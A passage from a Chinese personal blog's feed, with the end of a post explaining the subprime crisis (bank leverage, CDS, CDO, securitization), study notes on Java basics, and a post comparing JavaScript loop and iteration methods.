95，因此我破产了！</p><p>也就是说，当我的杠杆率为20倍的时候，我的资产只要缩水超过5%，我就要破产。可以看出，杠杆率越高，银行的风险就越大。</p><p>那么美国五大投行的杠杆率在2007年到底有多高呢？</p><p>2007年年底，它们的总资产达到了4.3万亿美元，而自有资本仅为2003亿美元，也就是说，它们的杠杆率达到了21.3倍！</p><p>在如此高杠杆率的情况下，又怎么可能扛得住全美房地产价格同时下跌，房屋贷款违约率在2007年飙升至20%以上的打击呢？</p><p>相比之下，欧洲的银行们更为危险：</p><p>声名卓著的瑞士信贷银行（Credit Suisse）在2007年的杠杆率为33倍；荷兰国际集团（ING）达到了49倍；德意志银行（Deutsche Bank）高达53倍；英国的巴克莱（Barclay）则高达61倍。</p><p>（这也是欧洲必须拯救希腊最重要的一个原因，因为欧洲银行业的杠杆率太高了，根本无法承受希腊违约所带来的后果）</p><p>难道政府不监管，就任由它们的杠杆率这样飙升吗？</p><p>事实上，在2004年以前，美国的银行业有规定的，这个规定是银行的杠杆率不得超过15倍。然而这一规定在2004年被美国的证监会 SEC 给取消了。多么令人匪夷所思的一个事件。</p><p><img src="https://i.imgur.com/q83dQCA.jpg" alt=""></p><p>提到 SEC —— 美国的证监会（负责监管美国金融业的一家政府机构）在次贷危机中的失职，《大空头》这部电影也提到了一部分原因。其中一个场景便是片中某位角色的妹妹本来在 SEC 就职，却对这位角色说她想去高盛（五大投行之首）工作，原因很简单，高盛的工资是 SEC 的数倍 …… 然后当这位小美女看到泳池边的一位帅哥时，就蹦蹦跳跳的过去了，边走边甩下一句话：他在高盛工作 ……</p><p>确实，很多书籍和纪录片都提到了这个问题，不论是评级机构也好，还是美国证监会也好，它们员工的工资都只有投资银行员工的几分之一甚至十几分之一。美国人也爱钱，尤其是华尔街 …… 因此最有才华的人肯定都去了投资银行。你让一群次有才华或没有才华的人去监管这世界上最有才华的年薪普遍达到七位数（美元）的一群人，确实有点难啊 </p><blockquote><p>四、 CDS 和 CDO</p></blockquote><p><strong> CDS</strong>，Credit Default Swap 信用违约互换！</p><p>我们先来谈谈卖空是什么。卖空就是靠赌资产价格的下跌来赚钱。一般的做法是先问别人借一些资产，比方说问别人借价值100万美元的股票，然后马上以现在的市场价100万把这些股票卖掉。过一段时间之后，当股票价格下跌时，比方说跌到了50万美元，再以50万美元的价格把这些股票买回来，还给当年借你股票的人，就可以净赚50万美元。</p><p>贝尔是如何使用 CDS 去卖空 MBS 的呢？</p><p>CDS 并不是贝尔发明的，而是于1993年由摩根银行发明，一经发明立刻改变了整个金融业，和证券化一起可以位列金融史上最伟大的发明之一。</p><p>CDS 是一种保险合约，假设我想把一个MBS卖给你，但是如果你怕它违约怎么办呢？你可以花一笔钱去向一个第三方（也可以向我）购买一个 CDS 合同。这样假如这个MBS违约了，这个第三方可以给你赔偿，保证你不会遭受任何损失（除了买 CDS 合约的钱，和保险与保费的概念一模一样）。</p><p>贝尔心想，当MBS开始大规模违约的时候，为其保险的CDS的价格一定会大幅上升，就好像飓风袭来之前房屋保险和医疗保险的保费一定会大幅上涨一样。如果在此时去囤积大量CDS合约的话，那么当次贷危机爆发的时候，当MBS违约率大幅上升的时候，这种对MBS保险的CDS的合约价格一定会涨到天上去！到时贝尔就可以大赚一笔了。</p><p>（插曲~2001年当高盛通过财务造假将希腊送进欧元区的时候，高盛早就预料到了希腊会爆发债务危机，因此在同一年向德意志工业银行购买了为期20年，价值10亿欧元的为希腊国债做保的CDS合约。当2009年希腊债务危机爆发时，这些CDS合约的价格暴涨了40倍！）</p><p>再说说 <strong>CDO</strong>，Collateralized debt obligation。</p><p>这一幕主要发生在影片中Mark和一位CDO经理的对话中。CDO就是将一大堆MBS放在一起，形成一个资产池，然后由一位CDO经理来管理，通过买卖其中MBS来赚钱的公司（MBS的价格是会随着市场环境而波动的）。在这里，一份份MBS就像一只只股票，而CDO就像一家股票基金，CEO经理则是这家公司的基金经理。而电影中出现的CDO Square，“CDO平方”就像基金的基金一样，不是为投资者直接挑选股票来买卖，而是通过为投资者挑选不同的股票基金来赚钱。CDO平方就是为投资者挑选CDO的公司 …… CDO对次贷危机和金融系统的影响并没有那么大。真正问题的关键还是在于所有这些资产的基础 —— 借款人的违约。</p><blockquote><p>五、证券化</p></blockquote><p>我们还可以来看看证劵化的过程在实际操作中是如何实现的。它涉及到了两个著名的词汇 —— <strong>“SPV特殊目的工具”</strong>和<strong>“表外融资”</strong>。</p><p>依然假设我是银行A，我的资产负债表上有20亿的 Receivables 应收账款（那些贷款买房的人欠我的钱），如果我不想等20年而是现在就想把它们变现，我就会选择，比方说，以16亿的价格卖给你，金融机构B。但事实上你并不会想要买我的贷款，因为这么一笔巨大的资产，流动性也非常差，如果需要的话，你很难把它转手卖给别人。于是我想了个办法，我把这些贷款变成一份一份的MBS，然后再卖给你。这种东西在市场上的流动性非常高，如果你愿意，你随时可以再把它转卖出去。举个例子，就好像我现在有一家公司，我想卖给你，你不愿买，因为流动性太差，于是我把我公司的资产变成股权，然后卖你股权，你肯定就愿意了，因为你可以随时再把这些股权转卖出去。</p><p>那么这个MBS是个什么东西呢？它只是一种协议，这个协议的内容就是你现在给我1.6亿美元现金，我在未来的20年内分期还你2亿美元的现金（签10份）。而且如果有人违约了，我可以收回他的房子去卖，然后把卖得的现金给你作为补偿。</p><p>当我们签完这样一个协议之后，我，银行A会发现我的资产负债表上资产项目多了16亿美元的现金，但负债项目突然多了20亿美元 Payables 应付账款，这样一下就让我的资产负债表变得很难看，如果这样的事做的多了，还会违反例如金融杠杆限制的监管规定。</p><p>于是我又想了一个好办法！</p><p>我先成立一家独立的公司（注意，不是子公司，而是完全独立于我的公司），然后我把贷款卖给它！然后它再把它们变成MBS再卖给你（你去跟它签那份本该和我签的协议）！</p><p>这样一个过程，对我来说有好处也有坏处。</p><p>坏处在于我成立这样的公司是要花钱的。好处在于我实现了传说中的“表外融资”！此时我的资产负债表就不再是资产多16亿，负债多20亿了，而是变成了资产少了4亿（由20亿变成了16亿），但它们由20年的应收账款变成了16亿的现金（而为了得到这16亿我可能仅花了15亿喔）！我马上又可以用这16亿去干同样的事了！</p><p>（还有一个好处就是我这些MBS的利息会低于我去发债券融资的利息，因为这家SPV是 Bankrupt Remote 破产风险隔离的 ……）</p><p>对你，金融机构B也是既有好处也有坏处。</p><p>好处和坏处都在于这个SPV是“破产风险隔离”的，意思就是说在这20年中，由于所有权已经从我这里转移到了SPV那里，因此如果贷款违约了，那么只能由它来承担了，但是它没有多少资本呀！它只是一个SPV而已，因此恐怕只能您来承担了 …… 但好处在于，如果我，银行A破产了，那么它，SPV，以及你对于这些贷款现金流的索取权是不会受到任何影响的。因为我对它来说，也是破产风险隔离的。</p><blockquote><p>六、一些误解</p></blockquote><p>1、对次贷危机的误解</p><p>只要是批评金融业的作品，就一定会强调政府为了拯救这些金融机构，花了超过8000亿美元纳税人的钱。</p><p>但事实上，这些钱都用来购买这些金融机构的优先股了。</p><p>优先股我们可以把它想象成一种债券，每年有8%~12%的利息。</p><p>在次贷危机最严重的一年过去后，被拯救的金融机构们都纷纷偿还了当年政府援助它们的钱，也就是赎回了优先股。</p><p>在这个过程中，政府不仅没有亏钱，反而为纳税人赚了不少。</p><p>所以别再拿纳税人的钱说事儿了 ……</p><p>2、激励问题</p><p>有人说次贷危机爆发的一个原因是因为激励问题。也就是当市场形式好的时候，这些金融机构的 CEO 们大赚特赚，而万一公司破产倒闭了，他们又不会受到什么影响，因此这是在激励他们去做更为冒险的事情。</p><p>事实上并非如此。在美国的公司治理制度下，CEO 们都会购买大量自己公司的股票。这很容易理解。如果连公司的 CEO 都不买自己公司的股票，那外人谁还敢买？例如吉米·戴蒙在2005年接管摩根大通时，就用自己一半的财富购买了摩根大通的股票。</p><p>因此，当贝尔斯登以每股2美元的价格被出售给摩根大通（一年前还高达170美元），当雷曼兄弟破产，股价变得一文不值，受损失最大的恰恰是这些公司的CEO 们 —— 他们都亏损了数十亿美元。如果以亏损金额占个人资产比例做一个排序的话，那么他们很可能正是这次危机中损失最大的人。</p><p>因此我们不能将次贷危机爆发的原因归咎于所谓的“激励机制”，这是不符合逻辑的。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一、金融业真的是多余的吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;很多电影都在暗示金融业是一个不创造任何财富的行业，好像是整个社会的寄生虫一般，这是错的非常离谱的。&lt;/p&gt;
&lt;p&gt;其实正是因为有了金融的运作 —— 股市的存在，西方国家才得以从19世纪马克思笔下的那种原汁原味的资本主义制度转型成了今天这种半资本主义半社会主义的制度。我们不妨再拿乔布斯举个例子。如果美国现在的经济制度还是延续着19世纪的传统的话，那么乔布斯很可能就是这个星球上有史以来最富有的人。原因很简单，苹果公司已经连续很多年荣膺全球最赚钱公司了，巅峰时期曾达到过一年赚500亿美元的纯利润，去年虽然下降了不少但依然有390亿美元。然而我们发现乔布斯在去世时只留下了86亿美元的财富。为什么会这样？&lt;/p&gt;
&lt;p&gt;因为乔布斯根本就不是一个资本家，苹果公司不属于他，而是属于全体股东 —— 最普通的美国老百姓的。&lt;/p&gt;
&lt;p&gt;这里就出了一个问题，既然这样，那乔布斯创立苹果之后，为什么要让它上市呢？为什么不像当年的约翰·洛克菲勒那样把它据为己有，然后取洛克菲勒而代之成为人类历史上最有钱的人呢？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/xdNGEkN.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;原因在于他做不到。如果他不这样做（上市），那么这样做了的人的公司就会得到迅速的发展，从而远远的将他和苹果公司甩在后面。这些人中的佼佼者，无疑就是比尔·盖茨先生。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《算法》--第一章--第一节 Java基础</title>
    <link href="wangsiyuan233.github.io/2018/06/13/52%E3%80%8A%E7%AE%97%E6%B3%95%E3%80%8B-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
    <id>wangsiyuan233.github.io/2018/06/13/52《算法》-第一章/</id>
    <published>2018-06-13T23:23:54.000Z</published>
    <updated>2018-06-17T13:32:45.822Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://book.douban.com/subject/10432347/" target="_blank" rel="external">《算法 （第四版）》</a></p><p>对于小的程序来说，用哪种方法解决问题并不重要，但是对于大的项目来说，就可以节约大量的时间了，是的，你可以通过提高硬件的配置来提升速度，但是和优雅的代码相比，这根本不是一个数量级的。</p><blockquote><p>1、Java 的基本结构</p></blockquote><a id="more"></a><p>要定义数据类型和创建函数，要用到下面的语法：</p><p><strong>1.1 原始数据类型</strong>：<br>（包括却不仅限于）整型int、 浮点型double、 布尔型、 字符型char;<br>怎样操作这些类型呢？ —— 用表达式哦<br>表达式的优先级： <code>！&gt; &amp;&amp; &gt; ||</code></p><p><strong>1.2 语句</strong>： 声明、 赋值、 条件、 循环<br>1.2.1 声明： Java 是强类型，声明一定要在使用之前，变量的作用域就是定义它的地方<br>1.2.2 赋值： <code>c=a+b</code> 是一个操作，左边必须是单个变量，语句的目的是改变c的值<br>1.2.3 条件： 通过不同的操作来处理不同的输入<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// if 语句 -- 表达差异</span></div><div class="line"><span class="keyword">if</span>(&lt;<span class="keyword">boolean</span> expression&gt;)&#123;&lt;<span class="keyword">block</span> statements&gt;&#125;</div><div class="line"><span class="keyword">else</span>&#123;&lt;<span class="keyword">block</span> statements&gt;&#125;</div></pre></td></tr></table></figure></p><p>1.2.4 循环： while、 break、 continue、 for<br>break 语句： 直接结束循环<br>continue 语句： 结束当前循环，进入下一循环<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// while 语句 -- 重复，()内为假时，什么也不做</span></div><div class="line"><span class="keyword">while</span> (&lt;<span class="keyword">boolean</span> expression&gt;) &#123;&lt;<span class="keyword">block</span> statements&gt;&#125;</div></pre></td></tr></table></figure></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">// <span class="keyword">for</span> 语句 -- 更紧凑的将[while 循环的最后一条语句的索引值 +<span class="number">1</span>]</div><div class="line"></div><div class="line"><span class="keyword">for</span>(<span class="variable">&lt;initialize&gt;</span>;<span class="variable">&lt;boolean expression&gt;</span>;<span class="variable">&lt;increment&gt;</span>)&#123;<span class="variable">&lt;block statement&gt;</span>&#125;</div><div class="line"></div><div class="line">// 上面的 <span class="keyword">for</span> 语句，大大的简化了下面的 while 循环</div><div class="line"></div><div class="line"><span class="variable">&lt;initialize&gt;</span>;</div><div class="line">while(<span class="variable">&lt;boolean expression&gt;</span>)&#123;<span class="variable">&lt;block statement&gt;</span>;<span class="variable">&lt;increment&gt;</span>&#125;</div></pre></td></tr></table></figure><p><strong>1.3 数组</strong>：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//声明、创建并初始化一个数组</span></div><div class="line">double[] a = new double[N];</div><div class="line">int[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">8</span>&#125;</div></pre></td></tr></table></figure></p><p>数组名代表的是整个数组，如果我们将一个数组变量赋值给另一个变量，那么这两个变量将会指向同一个数组，这种情况叫做 起别名。 </p><p>如果是打算复制数组，不允许通过起别名这个方法，而要通过下面这个方法进行数组复制：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//复制数组</span></div><div class="line"><span class="keyword">int</span> N = a.length;</div><div class="line"><span class="keyword">double</span>[] b = <span class="keyword">new</span> <span class="keyword">double</span>[N];</div><div class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++ ) &#123; b[i] = a[i] &#125;</div></pre></td></tr></table></figure></p><p><strong>1.4 静态方法</strong>：<br>静态方法是在被调用时顺序执行的语句，很多语言中把它叫做 函数</p><p><strong>1.5 字符串</strong>:<br>字符串并不是原始基本类型；</p><p>如果加号（+）的一个参数是字符串，那么 Java 会自动将其他参数都转换为字符串；也就是说，通过与一个空字符串相加，就能完成字符串的转换。 </p><p><strong>1.6 输入输出</strong>：<br>你键入的字符串，显示在屏幕上的过程，就是 I/O</p><p><em>小结：</em><br>第一小节大致的描述了一个完整的编程模型，但是现代编程更进一步，那就是数据抽象（面向对象编程OOP）；</p><p>数据抽象不仅仅是操作预定义的数据类型的静态方法，同时也鼓励程序定义自己的数据类型</p><blockquote><p>2、数据抽象</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://book.douban.com/subject/10432347/&quot;&gt;《算法 （第四版）》&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;对于小的程序来说，用哪种方法解决问题并不重要，但是对于大的项目来说，就可以节约大量的时间了，是的，你可以通过提高硬件的配置来提升速度，但是和优雅的代码相比，这根本不是一个数量级的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、Java 的基本结构&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JavaScript 中的几种遍历</title>
    <link href="wangsiyuan233.github.io/2018/06/07/51%E5%87%A0%E7%A7%8D%E9%81%8D%E5%8E%86/"/>
    <id>wangsiyuan233.github.io/2018/06/07/51几种遍历/</id>
    <published>2018-06-07T13:05:44.000Z</published>
    <updated>2018-06-16T13:48:38.836Z</updated>
    
    <content type="html"><![CDATA[<p>有下面的 数组 和 <code>JSON</code>对象：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">var Arr</span> = [<span class="string">'Javascript'</span>, <span class="string">'Gulp'</span>, <span class="string">'CSS3'</span>, <span class="string">'Grunt'</span>, <span class="string">'jQuery'</span>, <span class="string">'angular'</span>];</div><div class="line"><span class="attribute">var Obj</span> = &#123;</div><div class="line">    aaa: <span class="string">'Javascript'</span>,</div><div class="line">    bbb: <span class="string">'Gulp'</span>,</div><div class="line">    ccc: <span class="string">'CSS3'</span>,</div><div class="line">    ddd: <span class="string">'Grunt'</span>,</div><div class="line">    eee: <span class="string">'jQuery'</span>,</div><div class="line">    fff: <span class="string">'angular'</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><blockquote><p>一、For 循环</p></blockquote><a id="more"></a><figure class="highlight clojure"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(<span class="name">function</span>() &#123;</div><div class="line">    for(<span class="name"><span class="builtin-name">var</span></span> i=0, len=Arr.length; i&lt;len; i++) &#123;</div><div class="line">        if (<span class="name">i</span> == <span class="number">2</span>) &#123;</div><div class="line">            // return;   // 函数执行被终止</div><div class="line">            // break;    // 循环被终止</div><div class="line">            continue; // 循环被跳过</div><div class="line">        &#125;<span class="comment">;</span></div><div class="line">        console.log(<span class="name">'Arr</span>['+ i +']<span class="symbol">:'</span> + Arr[i])<span class="comment">;</span></div><div class="line">    &#125;</div><div class="line">&#125;)()<span class="comment">;</span></div></pre></td></tr></table></figure><p><strong>需要注意的是：</strong><br>1、<code>for</code>循环中的 <code>i</code> 在循环结束之后任然存在与作用域中，为了避免影响作用域中的其他变量，使用函数自执行的方式将其隔离起来<code>()()</code>;</p><p>2、避免使用 <code>for(var i=0; i&lt;demo1Arr.length; i++){}</code> 的方式，这样的数组长度每次都被计算，效率低于上面的方式。也可以将变量声明放在 <code>for</code> 的前面来执行，提高阅读性;</p><p>3、跳出循环的方式有如下几种：<br><code>return</code> 函数执行被终止<br><code>break</code> 循环被终止<br><code>continue</code> 循环被跳过</p><blockquote><p>二、 For in</p></blockquote><p><code>for(var item in arr|obj){}</code> 可以用于遍历数组和对象</p><ul><li>遍历数组时，<code>item</code> 表示索引值， <code>arr</code> 表示当前索引值对应的元素 <code>arr[item]</code></li><li>遍历对象时，<code>item</code> 表示 <code>key</code> 值，<code>arr</code> 表示 <code>key</code> 值对应的 <code>value</code> 值 <code>obj[item]</code></li></ul><figure class="highlight clojure"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(<span class="name">function</span>() &#123;</div><div class="line">    for(<span class="name"><span class="builtin-name">var</span></span> i in demoArr) &#123;</div><div class="line">        if (<span class="name">i</span> == <span class="number">2</span>) &#123;</div><div class="line">            return; // 函数执行被终止</div><div class="line">            // break;  // 循环被终止</div><div class="line">            // continue;  // 循环被跳过</div><div class="line">        &#125;<span class="comment">;</span></div><div class="line">        console.log(<span class="name">'demoArr</span>['+ i +']<span class="symbol">:'</span> + demoArr[i])<span class="comment">;</span></div><div class="line">    &#125;</div><div class="line">    console.log(<span class="name">'-------------'</span>)<span class="comment">;</span></div><div class="line">&#125;)()<span class="comment">;</span></div></pre></td></tr></table></figure><p><strong>需要注意的是：</strong><br>1、在 <code>for</code> 循环与 <code>for in</code> 循环中，<code>i</code> 值都会在循环结束之后保留下来。因此使用函数自执行的方式避免;</p><p>2、使用 <code>return</code>，<code>break</code>，<code>continue</code> 跳出循环都与 <code>for</code> 循环一致，不过关于 <code>return</code> 需要注意，在函数体中，<code>return</code> 表示函数执行终止，就算是循环外面的代码，也不再继续往下执行。而 <code>break</code> 仅仅只是终止循环，后面的代码会继续执行。例如 ：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">res</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> Arr = [<span class="string">'Javascript'</span>, <span class="string">'Gulp'</span>, <span class="string">'CSS3'</span>, <span class="string">'Grunt'</span>, <span class="string">'jQuery'</span>, <span class="string">'angular'</span>];</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> item <span class="keyword">in</span> Arr) &#123;</div><div class="line">        <span class="keyword">if</span> (item == <span class="number">2</span>) &#123;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;;</div><div class="line">        <span class="built_in">console</span>.log(item, Arr[item]);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'desc'</span>, <span class="string">'function res'</span>); <span class="comment">//不会执行</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>三、 forEach</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Arr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">val, index</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (e == <span class="string">'CSS3'</span>) &#123;</div><div class="line">        <span class="keyword">return</span>;  <span class="comment">// 循环被跳过</span></div><div class="line">        <span class="comment">// break;   // 报错</span></div><div class="line">        <span class="comment">// continue;// 报错</span></div><div class="line">    &#125;;</div><div class="line">    <span class="built_in">console</span>.log(val, index);</div><div class="line">&#125;)</div></pre></td></tr></table></figure><p><strong>需要注意的是：</strong><br>1、回调函数中有2个参数，分别表示值和索引，这一点与jQuery中的$.each相反<br>2、forEach无法遍历对象<br>3、forEach无法在IE中使用，firefox和chrome实现了该方法<br>4、forEach无法使用break，continue跳出循环，使用return时，效果和在for循环中使用continue一致</p><blockquote><p>四、do/while</p></blockquote><p>当使用continue时，如果你将i++放在了后面，那么i++的值将一直不会改变，最后陷入死循环。因此使用do/while一定要小心谨慎一点。</p><p>不建议使用do/while的方式来遍历数组<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 直接使用while</span></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> i = <span class="number">0</span>,</div><div class="line">        len = Arr.length;</div><div class="line">    <span class="keyword">while</span>(i &lt; len) &#123;</div><div class="line">        <span class="keyword">if</span> (i == <span class="number">2</span>) &#123;</div><div class="line">            <span class="comment">// return; // 函数执行被终止</span></div><div class="line">            <span class="comment">// break;  // 循环被终止</span></div><div class="line">            <span class="comment">// continue;  // 循环将被跳过，因为后边的代码无法执行，i的值没有改变，因此循环会一直卡在这里，慎用！！</span></div><div class="line">        &#125;;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'demoArr['</span>+ i +<span class="string">']:'</span> + Arr[i]);</div><div class="line">        i ++;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'------------------------'</span>);</div><div class="line">&#125;)();</div><div class="line"></div><div class="line"><span class="comment">// do while</span></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> i = <span class="number">0</span>,</div><div class="line">        len = Arr.length;</div><div class="line">    <span class="keyword">do</span> &#123;</div><div class="line">        <span class="keyword">if</span> (i == <span class="number">2</span>) &#123;</div><div class="line">            <span class="keyword">break</span>; <span class="comment">// 循环被终止</span></div><div class="line">        &#125;;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'demo2Arr['</span>+ i +<span class="string">']:'</span> + Arr[i]);</div><div class="line">        i++;</div><div class="line">    &#125; <span class="keyword">while</span>(i&lt;len);</div><div class="line">&#125;)();</div></pre></td></tr></table></figure></p><blockquote><p>五、$.each</p></blockquote><p>可以用来遍历数组和对象，其中e表示索引值或者key值，ele表示value值<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$.each(Arr, function(e, ele) &#123;</div><div class="line">    console.log(e, ele);</div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="comment">// 输出为：</span></div><div class="line"><span class="number">0</span> <span class="string">"Javascript"</span></div><div class="line"><span class="number">1</span> <span class="string">"Gulp"</span></div><div class="line"><span class="number">2</span> <span class="string">"CSS3"</span></div><div class="line"><span class="number">3</span> <span class="string">"Grunt"</span></div><div class="line"><span class="number">4</span> <span class="string">"jQuery"</span></div><div class="line"><span class="number">5</span> <span class="string">"angular"</span></div></pre></td></tr></table></figure></p><p><strong>需要注意的是：</strong><br>1、使用return 或者return true为跳过一次循环，继续执行后面的循环<br>2、使用return false为终止循环的执行，但是并不终止函数执行<br>3、无法使用break与continue来跳过循环<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//循环中this值输出类似如下:</span></div><div class="line"><span class="built_in">console</span>.log(<span class="keyword">this</span>);</div><div class="line"><span class="comment">//String &#123;0: "C", 1: "S", 2: "S", 3: "3", length: 4, [[PrimitiveValue]]: "CSS3"&#125;</span></div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="keyword">this</span> == ele);</div><div class="line"><span class="comment">// true</span></div><div class="line"></div><div class="line"><span class="comment">//遍历一下 this:</span></div><div class="line">$.each(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e, ele</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(e, ele);</div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="comment">//输出：</span></div><div class="line"><span class="number">0</span> c</div><div class="line"><span class="number">1</span> s</div><div class="line"><span class="number">2</span> s</div><div class="line"><span class="number">4</span> <span class="number">3</span></div></pre></td></tr></table></figure></p><p>javascript的内部属性中，将对象数据属性中的Enumerable设置为了false，所以length 和 [[PrimitiveValue]]没有遍历出来</p><p>$.each 中的 $(this) 与this有所不同，不过遍历结果却是一样</p><blockquote><p>六、$(selecter).each</p></blockquote><p>专门用来遍历DOMList<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">'.list li'</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">e, ele</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(e, ele);</div><div class="line">    <span class="comment">// console.log(this == ele); // true</span></div><div class="line">    $(<span class="keyword">this</span>).html(e);</div><div class="line">    <span class="keyword">if</span> ($(<span class="keyword">this</span>).attr(<span class="string">'data-item'</span>) == <span class="string">'do'</span>) &#123;</div><div class="line">        $(<span class="keyword">this</span>).html(<span class="string">'data-item: do'</span>);</div><div class="line">    &#125;;</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p><p>1、this 当前被遍历的DOM元素，不能调用jQuery方法<br>2、$(this) == $(ele) 当前被遍历元素的jquery对象，可以调用jquery的方法进行dom操作</p><blockquote><p>使用for in 遍历DOMList</p></blockquote><p>直接遍历的结果如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> domList = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'its'</span>);</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> item <span class="keyword">in</span> domList) &#123;</div><div class="line">    <span class="built_in">console</span>.log(item, <span class="string">':'</span> + domList[item]);</div><div class="line">&#125;</div><div class="line"><span class="comment">// 0: &lt;li&gt;&lt;/li&gt;</span></div><div class="line"><span class="comment">// 1: &lt;li&gt;&lt;/li&gt;</span></div><div class="line"><span class="comment">//    ...</span></div><div class="line"><span class="comment">// length: 5</span></div><div class="line"><span 